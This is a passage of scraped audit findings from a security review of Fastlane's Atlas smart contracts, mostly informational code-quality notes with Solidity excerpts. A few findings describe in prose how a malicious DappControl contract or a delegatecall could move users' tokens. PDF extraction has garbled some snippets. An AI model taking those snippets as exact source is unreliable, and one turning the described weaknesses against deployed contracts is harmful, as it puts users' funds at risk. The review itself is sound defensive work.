"https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "If _trySolverLock(solverOp) == false there is no error assigned to result, it just stays 0. The 0 value is later on used in the updateEscrow() check and in an emit. The updateEscrow() check is less fine grained this way. Troubleshooing on basis of the emitted event is somewhat difficult. 90 function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.canExecute() && _trySolverLock(solverOp)) { // ... } // ... key.solverOutcome = uint24(result); // result could be 0 if _trySolverLock fails _releaseSolverLock(/*...*/ , result, /*...*/ ); // ... emit SolverTxResult(solverOp.solver, solverOp.from, result.executedWithError(), false, result); // result could be 0 // ... ,! } function _releaseSolverLock(/*...*/ ) /*...*/ { // ... if (!bidFind && !result.updateEscrow()) return; // result could be 0 // ... } function updateEscrow(uint256 result) internal pure returns (bool) { return (result & _NO_REFUND == 0); }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Parameter callConfig seems redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In transferUserERC20() and transferDAppERC20(), which call _verifyCallerIsExecutionEnv() a check is done for msg.sender == _getExecutionEnvironmentCustom. This can only be the case with the current callConfig, because metacall() / _getOrCreateExecutionEnvironment() retrieves getDAppConfig(userOp).callConfig. However transferUserERC20() and transferDAppERC20() allow specifing callConfig, which only has added value if getDAppConfig(userOp).callConfig changes in between calls in the same transaction, which seems far fetched. 91 function transferUserERC20(..., address user, address controller, uint32 callConfig ,/*...*/ ) /*...*/ { _verifyCallerIsExecutionEnv(user, controller, callConfig); } function transferDAppERC20(..., address user, address controller, uint32 callConfig ,/*...*/ ) /*...*/ { _verifyCallerIsExecutionEnv(user, controller, callConfig); } function _verifyCallerIsExecutionEnv(address user, address controller, uint32 callConfig) internal view ,! override { if (msg.sender != _getExecutionEnvironmentCustom(user, controller.codehash, controller, callConfig)) { ,! revert EnvironmentMismatch(); } } /// @notice Generates the address of a user ,! /// DAppControl. function _getExecutionEnvironmentCustom(/*...*/ ) /*...*/ { changes in the  s execution environment affected by deprecated callConfig // generate address based on user, controlCodeHash, controller, callConfig, _salt } function metacall(/*...*/ ) /*...*/ { /*...*/ (address executionEnvironment, /*...*/ ) = _getOrCreateExecutionEnvironment(userOp); /*...*/ } function _getOrCreateExecutionEnvironment(/*...*/ ) /*...*/ { address control = userOp.control; dConfig = IDAppControl(control).getDAppConfig(userOp); executionEnvironment = _setExecutionEnvironment(control, userOp.from, dConfig.callConfig, control.codehash); ,! }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Prevent abuse of transferDAppERC20()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "If a userOp does a delegatecall, the destination contract could use transferDAppERC20() to trans- fer tokens from the DappControl contract. This is a feature but could also be abused.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "How to prevent malicious DappControl contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "A malicious DappControl contract could move all of the user's tokens, for which they have given an allowance to Atlas. This can be done via transferUserERC20(). A malicious DappControl contract could also set allowances for random tokens of an ExecutionEnvironment. That might be abused later on in combination with an external call from the ExecutionEnvironment.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "_availableFundsERC20() is optional which is not clear", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function _availableFundsERC20() does several checks to make sure transferUserERC20() and/or transferDAppERC20() will succeed. Functions transferUserERC20() and/or transferDAppERC20() check these limits again so the use of _availableFundsERC20() is optional, but this might not be clear. function _availableFundsERC20(/*...*/ ) /*...*/ { // checks balance, phase, source and allowance }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Internal functions forward() and forwardSpecial() not prefixt with _", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "forward() and forwardSpecial() functions are internal but the function name doesn't start with _, unlike most other internal functions. function forward(bytes memory data) internal pure returns (bytes memory) { // ... } function forwardSpecial(bytes memory data, ExecutionPhase phase) internal pure returns (bytes memory) { // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Outdated comment in _allocateValueCall() of V2DAppControl", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "_allocateValueCall() has an outdated comment because governance tokens are not burnt but sent to the user. function _allocateValueCall(address, uint256 bidAmount, bytes calldata) internal override { // ... /* console.log(\"Governance Tokens Burned:\", govIsTok0 ? amount0Out : amount1Out); */ // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "transfer() is used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "V2DAppControl uses transfer() which isn't best practice. function _allocateValueCall(address, uint256 bidAmount, bytes calldata) internal override { // ... ERC20(WETH).transfer(WETH_X_GOVERNANCE_POOL, bidAmount); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Math calculations could be bundled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _allocateValueCall() contains some math calculations and the library SwapMath also contains math calculations. For consistency they could be bundled in one place. function _allocateValueCall(address, uint256 bidAmount, bytes calldata) internal override { // ... if (govIsTok0) { amount0Out = ((997_000 * bidAmount) * uint256(token0Balance)) / ((uint256(token1Balance) * 1_000_000) + (997_000 * bidAmount)); } else { amount1Out = ((997_000 * bidAmount) * uint256(token1Balance)) / (((uint256(token0Balance) * 1_000_000) + (997_000 * bidAmount))); } // ... } 94", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Array lengths not checked in transmit() nor _verifyTransmitData()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Neither transmit() nor _verifyTransmitData() nor verifyTransmitSigners() checks the lenght of rs versus ss. In _verifyTransmitData():  When r.observations.length == 0 then the for loop will revert.  r.observations.length might be able to be compared to rs.length. In verifyTransmitSigners():  If rs.length > MAX_NUM_ORACLES then rawVs[i] will get out of bounds because it is only 32 bytes large. These situations could be used to detect mismatches and revert with a clear message. function transmit(/*...*/ , bytes32[] calldata rs, bytes32[] calldata ss, /*...*/ ) /*...*/ { // ... int256 answer = _verifyTransmitData(report, rs, ss, rawVs); // ... } function _verifyTransmitData(/*...*/ , bytes32[] calldata rs, bytes32[] calldata ss, /*...*/ ) /*...*/ { // ... for (uint256 i = 0; i < r.observations.length - 1; ++i) { // revert when length == 0 // ... } bool signersVerified = IChainlinkDAppControl(DAPP_CONTROL).verifyTransmitSigners(address(BASE_FEED), report, rs, ss, rawVs); ,! } function verifyTransmitSigners(/*...*/ , bytes32[] calldata rs, bytes32[] calldata ss,/*...*/ ) /*...*/ { // ... for (uint256 i = 0; i < rs.length; ++i) { /*...*/ uint8(rawVs[i]) /*...*/ // could get out of bounds } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Old term metaFlashCall used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Several test files mention metaFlashCall. This is a deprecated term. // This ensures a function can only be called through metaFlashCall // which includes security checks to work safely with Atlas modifier onlySelf() { require(msg.sender == address(this), \"Not called via metaFlashCall\"); _; }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Sorting same bids result in reverse order", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "If multiple Solvers have the same bid then the sorted order is the reverse of the input order. This is due to the >= operator in the if statement. function _sort(/*...*/ ) /*...*/ { // ... for (j = 0; j < count;) { if (sortingData[j].valid && sortingData[j].amount >= topBidAmount) { topBidAmount = sortingData[j].amount; topBidIndex = j; } unchecked { ++j; } } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Initialization with 0 is inconsistent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Sometimes variables are initialized with 0, and sometimes they are not initialized. This is not consis- tent. uint256 i = 0; for (uint256 i = 0; i < /*...*/ ; i++) { // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "unchecked not necessary in for loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "for loop index parameter increments no longer need unchecked in Solidity 0.8.22, see Solidity docs unchecked-loop-increment. function _bidKnownIteration(/*...*/ ) /*...*/ { // ... for (; i < k;) { // ... unchecked { ++i; } } }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Double negations in comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The comments in function updateEscrow() use double negations, which are difficult to read. function updateEscrow(uint256 result) internal pure returns (bool) { // dont update solver escrow if they don // returns true is solver doesn return (result & _NO_REFUND == 0);   t need to refund gas t get to bypass the refund. }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Function getCallChainHash() could use needsPreOpsCall()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function getCallChainHash() does a check with RequirePreOps. needsPreOpsCall() for easier maintainability and readability. It could also use the function function getCallChainHash(/*...*/ ) /*...*/ { // ... if (dConfig.callConfig & 1 << uint32(CallConfigIndex.RequirePreOps) != 0) { // ... } // ... } function needsPreOpsCall(uint32 callConfig) internal pure returns (bool needsPreOps) { needsPreOps = (callConfig & 1 << uint32(CallConfigIndex.RequirePreOps) != 0); }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "modifier payBids() can simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "modifier payBids() retrieves ETH for both the bid and the return of msg.value. This is not straight- forward: 98 modifier payBids(address bidToken, uint256 bidAmount) { // ... _; if (bidToken == address(0)) { // Ether balance uint256 ethOwed = bidAmount + msg.value; if (ethOwed > address(this).balance) { IWETH9(WETH_ADDRESS).withdraw(ethOwed - address(this).balance); } SafeTransferLib.safeTransferETH(msg.sender, bidAmount); } else { // ERC20 balance if (msg.value > address(this).balance) { IWETH9(WETH_ADDRESS).withdraw(msg.value - address(this).balance); } SafeTransferLib.safeTransfer(ERC20(bidToken), msg.sender, bidAmount); } }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Solver knows error codes of previous solvers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "key.solverOutcome and this value is passed to the next solver. It is unclear why the next solver should want to know the error code of the previous solver. Perhaps that information can somehow be abused. We would expect the solvers to be isolated. 99 function _executeSolverOperation( // ... result |= _solverOpWrapper(/*...*/ , key.pack()); key.solverOutcome = uint24(result); if (result.executionSuccessful()) { // ... return (true, key); } // ... } function _solverOpWrapper(/*...*/ , bytes32 lockBytes) /*...*/ { // ... bytes memory data = abi.encodeWithSelector(... solverMetaTryCatch.selector, /*...*/ ); data = abi.encodePacked(data, lockBytes); (success, data) = environment.call{ value: solverOp.value }(data); } function pack(EscrowKey memory self) internal pure returns (bytes32 packedKey) { packedKey = bytes32( abi.encodePacked( // ... self.solverOutcome, // ... ) ); }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Two different ways to represent errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "There are two approaches to store error information. One by storing one error in a uint256, via ValidCallsResult. The other by storing multiple errors as separate bits in a uint256, via SolverOutcome. The errors also partly overlap. This approach could be confusing and error prone. enum ValidCallsResult { Valid, GasPriceHigherThanMax, TxValueLowerThanCallValue, DAppSignatureInvalid, UserSignatureInvalid, TooManySolverOps, UserDeadlineReached, DAppDeadlineReached, ExecutionEnvEmpty, NoSolverOp, UnknownAuctioneerNotAllowed, InvalidSequence, InvalidAuctioneer, InvalidBundler, OpHashMismatch, DeadlineMismatch, InvalidControl, 100 InvalidSolverGasLimit, InvalidDAppNonce } enum SolverOutcome { // no refund (relay error or hostile user) InvalidSignature, InvalidUserHash, DeadlinePassedAlt, InvalidTo, UserOutOfGas, AlteredControl, // Partial Refund but no execution DeadlinePassed, GasPriceOverCap, InvalidSolver, PerBlockLimit, // solvers can only send one tx per block // if they sent two we wouldn InsufficientEscrow, GasPriceBelowUsers, CallValueTooHigh, // execution, with full user refund PreSolverFailed, SolverOpReverted, PostSolverFailed, IntentUnfulfilled, BidNotPaid, BalanceNotReconciled, EVMError  t be able to flag builder censorship }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Structs with limited comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Several structs have elements without comments.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Failed paymentsSuccessful might go undetected", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In _allocateValue(), if the call to allocateValue() fails then key.paymentsSuccessful is kept at false, and processing continues. This value is passed to the PostOps Hook, so that hook could take action on it. However this is not used in any of the examples. The function metacall() doesn't return any information about this, so if this situation occurs it might be difficult to detect for the caller. Also this value isn't emited anywhere, so it is also difficult to track offline. function _allocateValue(/*...*/ ) /*...*/ { // ... bytes memory data = abi.encodeWithSelector(IExecutionEnvironment.allocateValue.selector, ... )); // ... (bool success,) = key.executionEnvironment.call(data); if (success) { key.paymentsSuccessful = true; } return key; }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "No minimum value for ESCROW_DURATION", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The constructor of Storage doesn't enforce any limits on _escrowDuration. A too short duration might accidentally be set which will allow unbonding of AtlETH in an unexpected short period. constructor(uint256 _escrowDuration, /*...*/ ) /*...*/ { ESCROW_DURATION = _escrowDuration; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Consider penalizing bundlers for unused gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "For a solver to be considered successful in an Atlas transaction, they must pass a validateBal- ances() check at the end of the solverMetaTryCatch() function. This check will ensure that the Atlas deposits are larger than the Atlas claims + withdrawals, where claims is an upper-bound gas cost based on the starting gasleft(). Since a bundler can provide excess gas that will later be refunded to them, the claims value may be inflated at this point. While this unused gas is later subtracted in the _settle() function and the winning solver is reimbursed the excess ETH, this behavior implies an inefficiency. With a high initial gasleft() value, the winning solver would be required to provide otherwise unnecessary ETH which will be immediately returned to them.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Same nonce storage used for userOp.from and dAppOp.from", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The _handleNonces() function is used by both the _verifyUser() function (to invalidate the userOp.from nonce) and the _verifyDApp() function (to invalidate the dAppOp.from nonce). Regardless of the scenario, the underlying account address is treated the same in storage. So, if an address is sometimes the userOp.from value and other times the dAppOp.from value, the nonce management can be complicated. The most complex scenario would be if userOp.from == dAppOp.from in a single Atlas transaction. To allow simpler nonce management and better sequencing, using separate storage may be desirable in these edge cases.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Example code atlasSolverCall is limited", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function atlasSolverCall of SolverBase has no code for the invertsBidValue case. Function atlasSolverCall also returns exactly the bidAmount that was supplied as a parameter to atlasSolver- Call(). Although it retrieves bidBalance at the beginning of the function via modifier payBids(), it doesn't use it. modifier payBids(address bidToken, uint256 bidAmount) { // Track starting balances uint256 bidBalance = // not used bidToken == address(0) ? address(this).balance - msg.value : ERC20(bidToken).balanceOf(address(this)); _; // ... ,! }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Code duplication in solverMetaTryCatch()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function solverMetaTryCatch() contains some code duplication. For easier code maintenance and contract size reduction these parts could be combined. function solverMetaTryCatch(/*...*/ ) /*...*/ { // ... if (_bidFind()) { // ... if (endBalance > 0) { IEscrow(atlas).contribute{ value: endBalance }(); } (, success) = IEscrow(atlas).validateBalances(); if (!success) revert AtlasErrors.BalanceNotReconciled(); // ... revert AtlasErrors.BidFindSuccessful(netBid); } // ... if (endBalance > 0) { IEscrow(atlas).contribute{ value: endBalance }(); } (, success) = IEscrow(atlas).validateBalances(); if (!success) { revert AtlasErrors.BalanceNotReconciled(); } }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "withdrawSurcharge() might be done too early", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The surcharge is initialized in the constructor of Storage and increased via _settle(). Then it can be withdrawn via withdrawSurcharge(). However if this is done too early on and not enough ETH is present in the Atlas contract, then flashloans are not possible. This is not obvious. constructor(/*...*/ ) payable { // ... // Initialized with msg.value to seed flash loan liquidity surcharge = msg.value; // ... } function withdrawSurcharge() external { if (msg.sender != surchargeRecipient) { revert InvalidAccess(); } uint256 paymentAmount = surcharge; surcharge = 0; // Clear before transfer to prevent reentrancy SafeTransferLib.safeTransferETH(msg.sender, paymentAmount); emit SurchargeWithdrawn(msg.sender, paymentAmount); } function _settle(/*...*/ ) /*...*/ { // ... uint256 _surcharge = surcharge; // ... surcharge = _surcharge + netGasSurcharge; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Existence of both SURCHARGE and surcharge", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "contract Storage contains both SURCHARGE and surcharge which might be confusing. contract Storage is AtlasEvents, AtlasErrors { uint256 public constant SURCHARGE = 1_000_000; // Out of 10_000_000 uint256 public surcharge; // Atlas gas surcharges }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Direct access to accessData[], _balanceOf[] and bondedTotalSupply", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Several contracts outside of AtlETH access accessData[], _balanceOf[] and bondedTotalSupply directly, however it better to hide the implementation details. The updates outside of the AtlETH don't have emit attached so for an offchain indexer it is difficult to track all AtlETH movements.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Incorrent comment in reconcile()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The comment approvedAmount should probably be maxApprovedGasSpend. function reconcile(..., uint256 maxApprovedGasSpend) /*...*/ { // NOTE: approvedAmount is the amount of the solver // ...  s atlETH that the solver is allowing }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "validateBalances() and _checkAtlasIsUnlocked() could use isUnlocked()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "validateBalances() checks for a lock via the value of _deposits. It is safer and more readable to check this via the lock itself. _checkAtlasIsUnlocked() checks for a lock via the value UNLOCKED. It is more readable to use isUnlocked(). function validateBalances() /*...*/ { // ... // Check if locked. if (_deposits != type(uint256).max) { // ... } // ... } function isUnlocked() external view returns (bool) { return lock == UNLOCKED; } function _releaseAtlasLock() internal { // ... lock = UNLOCKED; // ... deposits = type(uint256).max; } address internal constant UNLOCKED = address(1); function _checkAtlasIsUnlocked() internal view { if (IAtlas(ATLAS).lock() != UNLOCKED) revert AtlasErrors.AtlasLockActive(); }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Future authorization might fail because solver contract isn't solverOp.from", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "solverOp.from. This checked to be the owner of the contract in modifier safetyFirst(). In the template SolverBase, atlasSolverCall() is called with the first parameter being Later on reconcile() is called, which currently is unauthorized: see issue \"reconcile() can be called by anyone\". Once authorization is added to this function then it should most likely be called by the same address as solverOp.from to allow verification. Then it isn't practical that solverOp.from is the owner. function solverMetaTryCatch(/*...*/ ) /*...*/ { ,! // ... /*...*/ solverCallData = abi.encodeWithSelector(ISolverContract.atlasSolverCall.selector, solverOp.from, /*...*/ ); (success,) = solverOp.solver.call{ gas: gasLimit, value: solverOp.value }(solverCallData); // ... } function atlasSolverCall(address sender, ...) safetyFirst(sender) /*...*/ { // ... } modifier safetyFirst(address sender) { // Safety checks require(sender == _owner, \"INVALID CALLER\"); // ... IEscrow(_atlas).reconcile{ value: msg.value }(msg.sender, sender, shortfall); }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Value in revert message in _settle() is not obvious", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _settle() tries to _assign() costs. If this fails then it reverts with a value that uses an updated deposits. This is not obvious when reading the code. function _settle(/*...*/ ) /*...*/ { // ... if (_deposits < _claims + _withdrawals) { // ... if (_assign(winningSolver, amountOwed, true, false)) { revert InsufficientTotalBalance((_claims + _withdrawals) - deposits); // uses updated ,! deposits } } else { // ... _credit(winningSolver, amountCredited); } // ... SafeTransferLib.safeTransferETH(bundler, _claims); // ... } 109 function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { // ... uint112 amt = uint112(amount); // ... if (aData.bonded < amt) { // ... if (bData.unbonding + aData.bonded < amt) { isDeficit = true; amount = uint256(bData.unbonding + aData.bonded); // contribute less to deposits ledger // ... } else { // ... } } else { // ... } bondedTotalSupply -= amount; deposits += amount; // this updated value is used in revert message of _settle } function _credit(address owner, uint256 amount) internal { // ... bondedTotalSupply += amount; // ... // no change in withdrawals }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "_releaseSolverLock() can be run without _trySolverLock()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In function _executeSolverOperation(), if _validateSolverOperation() fails (e.g. result !=0 ), then canExecute() will be false and then _trySolverLock() won't be executed. However _releaseSolverLock() is executed. With the current code this doesn't matter because it only assigns gas costs. Once suggested changes are made this could be a problem, see the issue \"Function _releaseSolver- Lock() doesn't undo all the actions of _trySolverLock()\". function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.canExecute()) { // ... (result, gasLimit) = _validateSolverOperation(dConfig, solverOp, gasWaterMark, result); // ... if (result.canExecute() && _trySolverLock(solverOp)) { // ... } // ... } _releaseSolverLock(solverOp, gasWaterMark, result, false, !prevalidated); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Reverting fallback() is unnecessary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Contract Escrow contains a fallback() with a revert();. This isn't necessary because the Atlas / Escrow will also revert is no fallback() is present. Perhaps its added to prevent accidentally adding another fallback() to one of the inherited contracts. In that case a comment would be useful. abstract contract Escrow is AtlETH { fallback() external payable { revert(); } }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "block.timestamp or block.number", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function permit() uses deadlines based on block.timestamp, however all other deadlines are based on block.number which might be confusing. From user's perspective, they may find it easier to know the deadline in timestamp instead of block number. function permit(/*...*/ ) /*...*/ { if (deadline < block.timestamp) revert PermitDeadlineExpired(); // ... } AtlETH uses lastAccessedBlock based on block.number but _validateSolverOperation() suggest to change to timestamp. function _validateSolverOperation( // NOTE: Turn this into time stamp check for FCFS L2s? if (lastAccessedBlock == block.number) { result |= 1 << uint256(SolverOutcome.PerBlockLimit); } } For this decicion it is important to be aware that on chains like Arbitrum there can be multiple blocks within the same block.timestamp. Such a change will prevent solvers to participate in multiple blocks within the same second. The deadlines in UserOp, SolverOp and DappOp are based on block.number, however no comment is made about this in the struct definitions. function _validCalls(/*...*/ ) /*...*/ { // ... // Check if past user if (block.number > userOp.deadline) { s deadline  // ... } // Check if past dapp if (block.number > dAppOp.deadline) { s deadline  // ... } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "_validateSolverOperation() uses two different ways to return a value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _validateSolverOperation() uses two different ways to return a gasLimit with value 0. function _validateSolverOperation(/*...*/ ) /*...*/ returns (uint256, uint256 gasLimit){ if (gasWaterMark < /*...*/ ) { return (result | 1 << /*...*/ , gasLimit); // gasLimit == 0 } if (block.number > solverOp.deadline) { return ( result | 1 /*...*/ , 0 ); // gasLimit == 0 } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Difference between Sorter and Atlas functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function Sorter - _verifySolverEligibility() partly overlaps with checks in _validate- SolverOperation() and verifySolverOp(). The overlapping parts could be combined. The differences shoud be doublechecked. When called via _bidFindingIteration(): verifySolverOp() is done once (via !prevalidated) and _vali- dateSolverOperation() is done twice. Operations related to block.number stay the same so they could move to verifySolverOp() to be only executed once. Also see issue \"_handleAltOpHash() executed even in error situations\". Note: Moving the block.number checks would not be a good idea if lastAccessedBlock could be updated in the mean time. This is almost the case see issue: \"Unreachable code in _assign()\". The names of verifySolverOp() and _validateSolverOperation() are similar which could be confusing. Differences between functions: _validateSolverOperation & verifySolverOp _verifySolverEligibility check signatures check solverOp.deadline check solverOp.to != ATLAS check solverOp.solver == ATLAS ... OR solverOp.solver == address(AtlasVerification) - - - - - complicated formula for gas estimates simple formula lastAccessedBlock == block.number solverLastActiveBlock >= block.number accessData[solverOp.from].bonded balanceOfBonded() accessData[solverOp.from].lastAccessedBlock accountLastActiveBlock() 113", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Some functions can be moved to AtlasVerification", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "_validateSolverOperation() is very similar to the validate / verify calls in AtlasVerification so they could be moved there for consistency and to free some contract size space in Atlas. Function _handleAltOpHash() is similar to _handleNonces() in AtlasVerification so it could be moved there for consistency and to free some contract size space in Atlas. The function name _handleAltOpHash() doesn't indicate it keeps track of something.", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Position of revert in _getBidAmount() can be clearer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _getBidAmount() does a revert after calling _releaseSolverLock(). Althought this re- vert shouldn't happen, it might just as well be done directly after the call. The revert doesn't return an error code, adding one might increase readability. As an unusual pattern is used, it is good to add a comment. 114 function _bidFindingIteration(/*...*/ ) /*...*/ { // ... key.bidFind = true; // ... /*...*/ _getBidAmount(/*...*/ ,key) /*...*/ // ... } function _getBidAmount(/*...*/ ) /*...*/ { // ... data = abi.encodeWithSelector( /*...*/ solverMetaTryCatch.selector, /*...*/ ); // ... (success, data) = key.executionEnvironment.call{ value: solverOp.value }(data); _releaseSolverLock(solverOp, gasWaterMark, result, true, true); if (success) { revert(); } // ... } function solverMetaTryCatch( if (_bidFind()) { revert AtlasErrors.BidFindSuccessful(netBid);", "labels": ["Spearbit", "Fastlane", "Severity: Informational"]}, {"title": "Function _validateSolverOperation() doesn't need parameter result", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In both _executeSolverOperation() and _getBidAmount() it is verified that result==0 before call- ing _validateSolverOperation(). So result doesn't have to be supplied to _validateSolverOperation(). Note: return (result |= 1 ...); doesn't require the = because the updated result isn't used after the return. 115 function _executeSolverOperation( if (result.canExecute()) { // ... (result, gasLimit) = _validateSolverOperation(/*...*/ , result); } // ... } function _getBidAmount( // ... if (!result.canExecute()) return 0; (result, gasLimit) = _validateSolverOperation(..., result); // ... } function _validateSolverOperation(..., if (/*...*/ ) { uint256 result) /*...*/ { return (result | 1 << uint256(SolverOutcome.UserOutOfGas), gasLimit); } if (/*...*/ ) { return (result | 1 << uint256(dConfig.callConfig.allowsTrustedOpHash() ? uint256(SolverOutcome.DeadlinePassedAlt) : uint256(SolverOutcome.DeadlinePassed) ), ,! 0 ); } if (/*...*/ ) { return (result |= 1 << uint256(SolverOutcome.CallValueTooHigh), gasLimit); } if (lastAccessedBlock == block.number) { result |= 1 << uint256(SolverOutcome.PerBlockLimit); } if (gasCost > solverBalance) { result |= 1 << uint256(SolverOutcome.InsufficientEscrow); } 